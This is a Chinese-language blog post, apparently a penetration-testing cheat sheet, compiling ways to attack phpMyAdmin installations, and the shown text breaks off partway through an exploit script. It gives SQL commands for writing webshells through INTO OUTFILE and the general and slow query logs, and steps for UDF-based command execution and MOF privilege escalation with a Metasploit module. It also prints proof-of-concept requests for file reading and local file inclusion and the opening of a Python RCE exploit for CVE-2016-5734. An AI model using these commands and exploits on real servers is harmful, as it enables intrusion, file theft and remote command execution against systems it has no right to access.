<!DOCTYPE html><html lang="zh-Hans"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="description" content="phpMyAdmin漏洞利用汇总"><meta name="keywords" content="漏洞,phpMyAdmin"><meta name="author" content="Ch4ce"><meta name="copyright" content="Ch4ce"><title>phpMyAdmin漏洞利用汇总 | Chaceshadow's Blog</title><link rel="shortcut icon" href="/favicon.png"><link rel="stylesheet" href="/css/index.css?version=1.7.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css?version=1.7.0"><meta name="format-detection" content="telephone=no"><meta http-equiv="x-dns-prefetch-control" content="on"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><script src="https://v1.hitokoto.cn/?encode=js&amp;charset=utf-8&amp;select=.footer_custom_text" defer></script><script>var GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: {"path":"./public/atom.xml","languages":{"hits_empty":"找不到您查询的内容:${query}"}},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  }
} </script><meta name="generator" content="Hexo 4.2.1"><link rel="alternate" href="/atom.xml" title="Chaceshadow's Blog" type="application/atom+xml">
</head><body><canvas class="fireworks"></canvas><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true"></i><div id="sidebar" data-display="true"><div class="toggle-sidebar-info text-center"><span data-toggle="切换文章详情">切换站点概览</span><hr></div><div class="sidebar-toc"><div class="sidebar-toc__title">目录</div><div class="sidebar-toc__progress"><span class="progress-notice">你已经读了</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar"></div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-信息收集"><span class="toc-text">0x01 信息收集</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-1-版本信息获取"><span class="toc-text">1.1 版本信息获取</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-2-绝对路径获取"><span class="toc-text">1.2 绝对路径获取</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-PhpMyAdmin利用"><span class="toc-text">0x02 PhpMyAdmin利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#2-1-写入文件GetShell"><span class="toc-text">2.1 写入文件GetShell</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#2-1-1-直接写入文件getshell"><span class="toc-text">2.1.1 直接写入文件getshell</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-1-2-通过写入日志文件getshell"><span class="toc-text">2.1.2 通过写入日志文件getshell</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-1-3-通过慢查询写入webshell"><span class="toc-text">2.1.3 通过慢查询写入webshell</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-2-User-defined-funct-ion（UDF）："><span class="toc-text">2.2 User defined funct ion（UDF）：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-3-MOF提权："><span class="toc-text">2.3 MOF提权：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-PhpMyAdmin漏洞利用"><span class="toc-text">0x03 PhpMyAdmin漏洞利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#3-1-WooYun-2016-199433：任意文件读取漏洞"><span class="toc-text">3.1 WooYun-2016-199433：任意文件读取漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-2-CVE-2014-8959：本地文件包含"><span class="toc-text">3.2 CVE-2014 -8959：本地文件包含</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-3-CVE-2016-5734-：后台命令执行RCE"><span class="toc-text">3.3 CVE-2016-5734 ：后台命令执行RCE</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-4-CVE-2018-12613：后台文件包含"><span class="toc-text">3.4 CVE-2018-12613：后台文件包含</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-5-CVE-2018-19968：任意文件包含-RCE"><span class="toc-text">3.5 CVE-2018-19968：任意文件包含&#x2F;RCE</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-6-CVE-2020-0554：后台SQL注入"><span class="toc-text">3.6 CVE-2020-0554：后台SQL注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-7-CVE-2019-12922-跨站请求伪造"><span class="toc-text">3.7 CVE-2019-12922 跨站请求伪造</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-8-CVE-2017-1000499-跨站请求伪造"><span class="toc-text">3.8 CVE-2017-1000499 跨站请求伪造</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-特殊版本GetShell"><span class="toc-text">0x04 特殊版本GetShell</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#4-1-CVE-2013-3238"><span class="toc-text">4.1 CVE-2013-3238</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-2-CVE-2012-5159"><span class="toc-text">4.2 CVE-2012-5159</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-3-CVE-2009-1151"><span class="toc-text">4.3 CVE-2009-1151</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-4-弱口令-amp-万能密码"><span class="toc-text">4.4 弱口令&amp;万能密码</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x05-参考链接"><span class="toc-text">0x05 参考链接</span></a></li></ol></div></div><div class="author-info hide"><div class="author-info__avatar text-center"><img src="/img/avatar.png"></div><div class="author-info__name text-center">Ch4ce</div><div class="author-info__description text-center">孟冬</div><div class="follow-button"><a href="https://github.com/Chaceshadow" target="_blank" rel="noopener">Follow Me</a></div><hr><div class="author-info-articles"><a class="author-info-articles__archives article-meta" href="/archives"><span class="pull-left">文章</span><span class="pull-right">19</span></a><a class="author-info-articles__tags article-meta" href="/tags"><span class="pull-left">标签</span><span class="pull-right">48</span></a><a class="author-info-articles__categories article-meta" href="/categories"><span class="pull-left">分类</span><span class="pull-right">7</span></a></div></div></div><div id="content-outer"><div id="top-container" style="background-image: url(/welcome-image.jpg)"><div id="page-header"><span class="pull-left"> <a id="site-name" href="/">Chaceshadow's Blog</a></span><i class="fa fa-bars toggle-menu pull-right" aria-hidden="true"></i><span class="pull-right menus">   <a class="site-page" href="/">Home</a><a class="site-page" href="/archives">Archives</a><a class="site-page" href="/gallery">Gallery</a><a class="site-page" href="/categories">Categories</a><a class="site-page" href="/about">About</a></span><span class="pull-right"><a class="site-page social-icon search"><i class="fa fa-search"></i><span> Search</span></a></span></div><div id="post-info"><div id="post-title">phpMyAdmin漏洞利用汇总</div><div id="post-meta"><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2020-10-14</time><span class="post-meta__separator">|</span><i class="fa fa-inbox post-meta__icon" aria-hidden="true"></i><a class="post-meta__categories" href="/categories/%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/">漏洞总结</a><div class="post-meta-wordcount"><span>字数总计: </span><span class="word-count">3.9k</span><span class="post-meta__separator">|</span><span>阅读时长: 17 分钟</span></div></div></div></div><div class="layout" id="content-inner"><article id="post"><div class="article-container" id="post-content"><blockquote>
<p>phpMyAdmin 是一个以PHP为基础，以Web-Base方式架构在网站主机上的MySQL的数据库管理工具，让管理者可用Web接口管理MySQL数据库。借由此Web接口可以成为一个简易方式输入繁杂SQL语法的较佳途径，尤其要处理大量资料的汇入及汇出更为方便。其中一个更大的优势在于由于phpMyAdmin跟其他PHP程式一样在网页服务器上执行，但是您可以在任何地方使用这些程式产生的HTML页面，也就是于远端管理MySQL数据库，方便的建立、修改、删除数据库及资料表。也可借由phpMyAdmin建立常用的php语法，方便编写网页时所需要的sql语法正确性。</p>
</blockquote>
<h2 id="0x01-信息收集"><a href="#0x01-信息收集" class="headerlink" title="0x01 信息收集"></a>0x01 信息收集</h2><h3 id="1-1-版本信息获取"><a href="#1-1-版本信息获取" class="headerlink" title="1.1 版本信息获取"></a>1.1 版本信息获取</h3><p>获取phpmyadmin版本信息，在网址根路径后面添加</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">readme.php</span><br><span class="line">README</span><br><span class="line">changelog.php</span><br><span class="line">Change</span><br><span class="line">Documetation.html</span><br><span class="line">Documetation.txt</span><br><span class="line">translators.html</span><br></pre></td></tr></table></figure>

<p>（注意区分大小写）就可以看到phpmyadmin的相关版本信息了，这个方法也是通杀的，只要管理员不把他们删掉。</p>
<p>也可以直接访问：/doc/html/index.html目录</p>
<h3 id="1-2-绝对路径获取"><a href="#1-2-绝对路径获取" class="headerlink" title="1.2 绝对路径获取"></a>1.2 绝对路径获取</h3><p>(1) phpinfo() 页面：最理想的情况，直接显示web路径<br>(2) web报错信息：可以通过各种fuzz尝试让目标报错，也有可能爆出绝对路径<br>(3) 一些集成的web框架：如果目标站点是利用phpstudy、LAMPP等之类搭建的，可以通过查看数据库路径</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show variables like &#39;%datadir%&#39;;</span><br></pre></td></tr></table></figure>

<p>再猜解web路径的方法，一般容易成功。<br>(4)  利用select load_file() 读取文件找到web路径：可以尝试/etc/passwd，apache|nginx|httpd log之类的文件。</p>
<p><em>Trick：如何判断目录是否存在，往往确定了/var/www/html目录，但是还有一层目录不能  确定，可以采用目标域名+常用的网站根目录的方式进行爆破，当使用</em></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select &#39;test&#39; into outfile &#39;&#x2F;var&#x2F;www&#x2F;$fuzz$&#x2F;shell.php&#39;；</span><br></pre></td></tr></table></figure>

<p>时目录$fuzz$不存在将会报错Can’t create/write to file ‘/var/www/html/666.txt’ (Errcode: 2)；如果存在但是目录写不进去将返回(Errcode: 13)；如果使用的</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">load data infile &quot;&#x2F;etc&#x2F;passwd&quot; into table test;</span><br></pre></td></tr></table></figure>

<p>该语句执行后将也会显示文件是否存在，有权限能否写等信息。</p>
<p>（5）其他方法</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1.查看数据库表内容获取 有一些cms会保存网站配置文件 或者路径</span><br><span class="line">2.进入后台</span><br><span class="line">3.百度出错信息 zoomeye shadon 搜索error warning</span><br><span class="line">4. @@datadir参数看mysql路径 反猜绝对路径</span><br></pre></td></tr></table></figure>

<h2 id="0x02-PhpMyAdmin利用"><a href="#0x02-PhpMyAdmin利用" class="headerlink" title="0x02 PhpMyAdmin利用"></a>0x02 PhpMyAdmin利用</h2><h3 id="2-1-写入文件GetShell"><a href="#2-1-写入文件GetShell" class="headerlink" title="2.1 写入文件GetShell"></a>2.1 写入文件GetShell</h3><p>可以通过写shell进行提权，而我们需要满足以下条件：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.数据库root权限</span><br><span class="line">2.知道网站的物理路径</span><br><span class="line">3.数据库有写权限</span><br></pre></td></tr></table></figure>

<p>MySQL 5.0+的版本会，然后在服务运行的情况下修改变量变量也可以移动文件位置的，但是必须要对生成日志的目录具有可更改的写权限。（Linux环境下可能会比较苛刻，因为站点目录是一个用户，MySQL是另外一个用户，权限管控较大严格，主要取决于权限配置是否得当）</p>
<h4 id="2-1-1-直接写入文件getshell"><a href="#2-1-1-直接写入文件getshell" class="headerlink" title="2.1.1 直接写入文件getshell"></a>2.1.1 直接写入文件getshell</h4><p>直接用into outfile 直接在网站目录下写入webshell，但是该方法需要前提条件是：<br>(1) 当前的数据库用户有写权限<br>(2) 知道web绝对路径<br>(3) web路径能写</p>
<p>如何判断当前数据库用户有写权限？<br>执行：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show variables like &#39;%secure%&#39;;</span><br></pre></td></tr></table></figure>

<p>如果secure_file_priv如果非空，则只能在对应的目录下读文件，如果是空即可在其他目录写。Linux下默认/tmp目录可写。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">secure-file-priv特性</span><br><span class="line">secure-file-priv参数是用来限制LOAD DATA, SELECT ... OUTFILE, and LOAD_FILE()传到哪个指定目录的。</span><br><span class="line">当secure_file_priv的值为null ，表示限制mysql 不允许导入|导出</span><br><span class="line">当secure_file_priv的值为&#x2F;tmp&#x2F; ，表示限制mysql 的导入|导出只能发生在&#x2F;tmp&#x2F;目录下</span><br><span class="line">当secure_file_priv的值没有具体值时，表示不对mysql 的导入|导出做限制</span><br><span class="line">可以在mysql-ini文件中设置其属性</span><br></pre></td></tr></table></figure>

<p>编写一句phpinfo文件，</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select &quot;&lt;?php phpinfo();?&gt;&quot; INTO OUTFILE  &quot;d:\\phpstudy\\www\\7.php&quot;</span><br></pre></td></tr></table></figure>

<p>这里必须注意要双反斜线，否则会转义，</p>
<h4 id="2-1-2-通过写入日志文件getshell"><a href="#2-1-2-通过写入日志文件getshell" class="headerlink" title="2.1.2 通过写入日志文件getshell"></a>2.1.2 通过写入日志文件getshell</h4><p>读写权限+web绝对路径，修改日志文件为webshell</p>
<p>具体利用方法如下</p>
<p>(1) 开启日志记录:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set global general_log &#x3D; &quot;ON&quot;;</span><br></pre></td></tr></table></figure>

<p>(2) 查看当前的日志目录:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show variables like &#39;general%&#39;;</span><br></pre></td></tr></table></figure>

<p>(3) 指定日志文件</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set global general_log_file &#x3D; &quot;C:&#x2F;phpStudy&#x2F;PHPTutorial&#x2F;WWW&#x2F;404.php&quot;;</span><br></pre></td></tr></table></figure>

<p>(4)) 写入执行代码：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select &quot;&lt;?php phpinfo();?&gt;&quot;;</span><br></pre></td></tr></table></figure>

<h4 id="2-1-3-通过慢查询写入webshell"><a href="#2-1-3-通过慢查询写入webshell" class="headerlink" title="2.1.3 通过慢查询写入webshell"></a>2.1.3 通过慢查询写入webshell</h4><p>具体方法如下：</p>
<p>(1) 查看当前慢查询日志目录：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show variables like &#39;%slow%&#39;;</span><br></pre></td></tr></table></figure>

<p>(2) 重新设置路径：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set GLOBAL slow_query_log_file&#x3D;&#39;C:&#x2F;phpStudy&#x2F;PHPTutorial&#x2F;WWW&#x2F;slow.php&#39;;</span><br></pre></td></tr></table></figure>

<p>(3) 开启慢查询日志：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set GLOBAL slow_query_log&#x3D;on;</span><br></pre></td></tr></table></figure>

<p>(4)) 执行写入日志：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select &#39;&lt;?php phpinfo();?&gt;&#39; from mysql.db where sleep(10);</span><br></pre></td></tr></table></figure>

<h3 id="2-2-User-defined-funct-ion（UDF）："><a href="#2-2-User-defined-funct-ion（UDF）：" class="headerlink" title="2.2 User defined funct ion（UDF）："></a><strong>2.2 User defined funct ion（UDF）：</strong></h3><p>适用于Windows和Linux环境，利用需要的条件：具有写权限+插件目录可写（或者可以更改指定的插件目录）。具体情况要看目标mysql的版本：<br>(1) Mysql version &gt; 5.1 时，dll或者so必须位于mysql安装目录lib\plugin下，当对该目录具有写权限时可以利用，查看：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show variables like %plugin%；&#x2F;&#x2F; 查看插件目录</span><br></pre></td></tr></table></figure>

<p>(2) 5.0 &lt;= Mysql version &lt;5.1时，需要导出至目标服务器的系统目录，如C://Windows/System32<br>(3) Mysql version &lt; 5.0 时，目录可以自定义具体利用如下：<br>a 根据目标mysql版本写入特定目录的so或者dll，可以参考sqlmap里面的</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select &#39;It is dll&#39; into dumpfile &#39;C:\Program Files\MySQL\MySQL Server 5.1\l ib\plugin\lib_mysqludf_sys.dll&#39;;</span><br></pre></td></tr></table></figure>

<p>b 创建对应的function：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">create function sys_eval returns string soname &quot;lib_mysqludf_sys.dll&quot;;</span><br></pre></td></tr></table></figure>

<p>c 执行命令：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from mysql.func where name &#x3D; &#39;sys_eval&#39;;   	 #查看创建的sys_eval函数select sys_eval(&#39;whoami&#39;);                          			 #使用系统命令</span><br></pre></td></tr></table></figure>

<h3 id="2-3-MOF提权："><a href="#2-3-MOF提权：" class="headerlink" title="2.3 MOF提权："></a>2.3 MOF提权：</h3><p>通过mysql将文件写入一个MOF文件替换掉原有的MOF文件，然后系统每隔五秒就会执行一次上传的MOF。一般适用于Windows &lt;= 2003，并且C:\Windows\System32\mof目录具有写权限（一般是没有权限写）。可以使用MSF直接利用：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">use exploit&#x2F;windows&#x2F;mysql&#x2F;mysql_mof</span><br><span class="line">set rhost 192.168.1.5</span><br><span class="line">set rport 3306</span><br><span class="line">set password root</span><br><span class="line">set username root</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>

<h2 id="0x03-PhpMyAdmin漏洞利用"><a href="#0x03-PhpMyAdmin漏洞利用" class="headerlink" title="0x03 PhpMyAdmin漏洞利用"></a>0x03 PhpMyAdmin漏洞利用</h2><h3 id="3-1-WooYun-2016-199433：任意文件读取漏洞"><a href="#3-1-WooYun-2016-199433：任意文件读取漏洞" class="headerlink" title="3.1 WooYun-2016-199433：任意文件读取漏洞"></a>3.1 WooYun-2016-199433：任意文件读取漏洞</h3><p>影响范围：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">phpMyAdmin version</span><br><span class="line">	2.x版本</span><br></pre></td></tr></table></figure>

<p>POC如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;scripts&#x2F;setup.php HTTP&#x2F;1.1 </span><br><span class="line">Host: your-ip:8080</span><br><span class="line">Accept-Encoding: gzip, deflate Accept: *&#x2F;*</span><br><span class="line">Accept-Language: enUser-Agent: Mozilla&#x2F;5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trid ent&#x2F;5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded </span><br><span class="line">Content-Length: 80</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">action&#x3D;test&amp;configuration&#x3D;O:10:&quot;PMA_Config&quot;:1:&#123;s:6:&quot;source&quot;,s:11:&quot;&#x2F;etc&#x2F;passwd&quot;;&#125;</span><br></pre></td></tr></table></figure>

<h3 id="3-2-CVE-2014-8959：本地文件包含"><a href="#3-2-CVE-2014-8959：本地文件包含" class="headerlink" title="3.2 CVE-2014 -8959：本地文件包含"></a>3.2 CVE-2014 -8959：本地文件包含</h3><p>影响范围：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">phpMyAdmin version</span><br><span class="line">	4.0.1~4.2.12</span><br><span class="line">PHP version</span><br><span class="line">	&lt; 5.3.4</span><br></pre></td></tr></table></figure>

<p>POC如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;gis_data_editor.php?token&#x3D;2941949d3768c57b4342d94ace606e91&amp;gis_data[gis_type]&#x3D;&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;phpinfo.txt%00    # 注意改下token值</span><br></pre></td></tr></table></figure>

<p>在实际利用中可以利用写入文件到/tmp目录下结合此漏洞完成RCE，php版本可以通过http header、导出表内容到文件的附加内容看到。</p>
<h3 id="3-3-CVE-2016-5734-：后台命令执行RCE"><a href="#3-3-CVE-2016-5734-：后台命令执行RCE" class="headerlink" title="3.3 CVE-2016-5734 ：后台命令执行RCE"></a>3.3 CVE-2016-5734 ：后台命令执行RCE</h3><p>影响范围：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">phpMyAdmin version</span><br><span class="line">	4.0.10.16 之前的4.0.x版本</span><br><span class="line">	4.4.15.7 之前的 4.4.x版本</span><br><span class="line">	4.6.3之前的 4.6.x版本</span><br><span class="line"></span><br><span class="line">PHP version</span><br><span class="line">	4.3.0~5.4.6</span><br><span class="line">Php 5.0 版本以上的将 preg_replace 的 &#x2F;e修饰符给废弃掉了</span><br></pre></td></tr></table></figure>

<p>POC如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="string">"""cve-2016-5734.py: PhpMyAdmin 4.3.0 - 4.6.2 authorized user RCE exploit</span></span><br><span class="line"><span class="string">Details: Working only at PHP 4.3.0-5.4.6 versions, because of regex break with null byte fixed in PHP 5.4.7.</span></span><br><span class="line"><span class="string">CVE: CVE-2016-5734</span></span><br><span class="line"><span class="string">Author: https://twitter.com/iamsecurity</span></span><br><span class="line"><span class="string">run: ./cve-2016-5734.py -u root --pwd="" http://localhost/pma -c "system('ls -lua');"</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">__author__ = <span class="string">"@iamsecurity"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    parser = argparse.ArgumentParser()</span><br><span class="line">    parser.add_argument(<span class="string">"url"</span>, type=str, help=<span class="string">"URL with path to PMA"</span>)</span><br><span class="line">    parser.add_argument(<span class="string">"-c"</span>, <span class="string">"--cmd"</span>, type=str, help=<span class="string">"PHP command(s) to eval()"</span>)</span><br><span class="line">    parser.add_argument(<span class="string">"-u"</span>, <span class="string">"--user"</span>, required=<span class="literal">True</span>, type=str, help=<span class="string">"Valid PMA user"</span>)</span><br><span class="line">    parser.add_argument(<span class="string">"-p"</span>, <span class="string">"--pwd"</span>, required=<span class="literal">True</span>, type=str, help=<span class="string">"Password for valid PMA user"</span>)</span><br><span class="line">    parser.add_argument(<span class="string">"-d"</span>, <span class="string">"--dbs"</span>, type=str, help=<span class="string">"Existing database at a server"</span>)</span><br><span class="line">    parser.add_argument(<span class="string">"-T"</span>, <span class="string">"--table"</span>, type=str, help=<span class="string">"Custom table name for exploit."</span>)</span><br><span class="line">    arguments = parser.parse_args()</span><br><span class="line">    url_to_pma = arguments.url</span><br><span class="line">    uname = arguments.user</span><br><span class="line">    upass = arguments.pwd</span><br><span class="line">    <span class="keyword">if</span> arguments.dbs:</span><br><span class="line">        db = arguments.dbs</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        db = <span class="string">"test"</span></span><br><span class="line">    token = <span class="literal">False</span></span><br><span class="line">    custom_table = <span class="literal">False</span></span><br><span class="line">    <span class="keyword">if</span> arguments.table:</span><br><span class="line">        custom_table = <span class="literal">True</span></span><br><span class="line">        table = arguments.table</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        table = <span class="string">"prgpwn"</span></span><br><span class="line">    <span class="keyword">if</span> arguments.cmd:</span><br><span class="line">        payload = arguments.cmd</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        payload = <span class="string">"system('uname -a');"</span></span><br><span class="line"></span><br><span class="line">    size = <span class="number">32</span></span><br><span class="line">    s = requests.Session()</span><br><span class="line">    <span class="comment"># you can manually add proxy support it's very simple ;)</span></span><br><span class="line">    <span class="comment"># s.proxies = &#123;'http': "127.0.0.1:8080", 'https': "127.0.0.1:8080"&#125;</span></span><br><span class="line">    s.verify = <span class="literal">False</span></span><br><span class="line">    sql = <span class="string">'''CREATE TABLE `&#123;0&#125;` (</span></span><br><span class="line"><span class="string">      `first` varchar(10) CHARACTER SET utf8 NOT NULL</span></span><br><span class="line"><span class="string">    ) ENGINE=InnoDB DEFAULT CHARSET=latin1;</span></span><br><span class="line"><span class="string">    INSERT INTO `&#123;0&#125;` (`first`) VALUES (UNHEX('302F6500'));</span></span><br><span class="line"><span class="string">    '''</span>.format(table)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># get_token</span></span><br><span class="line">    resp = s.post(url_to_pma + <span class="string">"/?lang=en"</span>, dict(</span><br><span class="line">        